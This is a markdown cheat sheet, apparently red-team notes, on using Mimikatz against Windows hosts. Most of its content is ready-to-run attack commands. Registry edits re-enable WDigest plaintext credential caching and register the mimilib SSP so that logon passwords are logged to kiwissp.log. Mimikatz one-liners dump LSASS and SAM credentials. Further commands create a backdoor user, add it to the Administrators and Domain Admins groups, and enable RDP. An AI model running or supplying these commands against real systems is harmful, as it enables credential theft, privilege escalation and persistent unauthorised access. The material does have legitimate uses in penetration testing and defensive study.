### Rudimentary Mimikatz_Note

```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 By Default since window 10 relase.
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```
# Security Support Provider
Security Support Provider Interface (SSPI) is a Win32 API used by Microsoft Windows systems to perform a variety of security-related operations.
The LSASS process is loading the security support provider DLL’s during Windows startup therefore SSP May Allow an attacker to leverage to persist and stealing plaintest password in the context of affect compromised box.
```
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
type C:\Windows\System32\kiwissp.log


```
![Image of Yaktocat](https://github.com/NyaMeeEain/Infrastructure-Assessment/raw/master/Lateral%20Movement/Images/SSP.PNG)

Upon rebooting the Machine, The users used credentials would be located as  **C:\Windows\System32\kiwissp.log** T**ested against Window updated Version 10.0.19041.388 Build**
![Image of \kiwissp.log](https://github.com/NyaMeeEain/Infrastructure-Assessment/raw/master/Lateral%20Movement/Images/SSP_Log.PNG)
###
```
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
mimikatz token::elevate lsadump::sam
mimikatz "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"
mimikatz "lsadump::sam"
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
```
# Rudimentary Mimikatz
A privilege is a right granted to an account to perform privileged operations within the operating system. Mimikatz allows the request of privileges for it’s current process to allow it to perform the tasks it needs.
# Privilege Modules

* **privilege::debug** - SeDebugPrivilege is very powerful,it allows the holder to debug another process, this includes reading and writing to that process' memory.

* **privilege::driver** - SeLoadDriverPrivilege Required to load or unload a device driver. Drivers run in the kernel in ring 0. A user using this privilege must already be able to have write access to HKLM or the code have workaround abusing RID references in HKCU

* **privilege::security** - SeSecurityPrivilege Required to perform a number of security-related functions, such as controlling and viewing audit messages. This privilege identifies its holder as a security operator. User Right:Manage auditing and security log.

* **privilege::tcb** - SeTcbPrivilege This privilege identifies its holder as part of the trusted computer base. Some trusted protected subsystems are granted this privilege, abused for privilege escalation.

* **privilege::backup** - SeBackupPrivilege This privilege causes the system to grant all read access control to any file, regardless of the access control list (ACL) specified for the filee.

* **privilege::restore** - SeRestorePrivilege Required to perform restore operations. Causes the system to grant all write access control to any file on the system, regardless of the files ACL.

* **privilege::sysenv** - SeSystemEnvironmentPrivilege Required to modify the nonvolatile RAM of systems that use this type of memory to store configuration information.User Right: Modify firmware environment values.


# Tokens Modules
Every process or thread created by a user inherits a copy of their token.This token is used by to perform access checks when accessing securable objects or performing privileged actions within the operating system.Impersonation allows for a thread to perform an operationusing an access token from another user or client.
Impersonation tokens are typically used in client/server communication.


* **token::whoami** - Display current identity

* **token::list** - List all or selected tokens of the system

* **token::elevate** - Impersonate a token

* **token::run** - run a program and assign the specified token

The command **token::whoami** will display tokens available to the session

* token::list /user:John
* token::list /domainadmin 
* token::list /enterpriseadmin

# Process Module
The process modules allows for manipulating processes, creating new processes

* **process::list** command will enumerate and list current running processes with basic information.

# Creating a Process
* **process::run** - The command will execute the command and show the output of the command. The command that is ran must exit or it will hang the session
* **process::start** - The command will start the process. The PID of the process will be returned
```
process::run "cmd.exe /c hostname && ipconfig"
process::run "cmd.exe /c net user MeMe 123456!@ /add && net localgroup "Remote Desktop users" MeMe /add && net localgroup Administrators MeMe /add"
process::run "cmd.exe /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
process::run "cmd.exe /c  net user MeMe 123456!@ /add && net group "domain admins" MeMe /add"
```
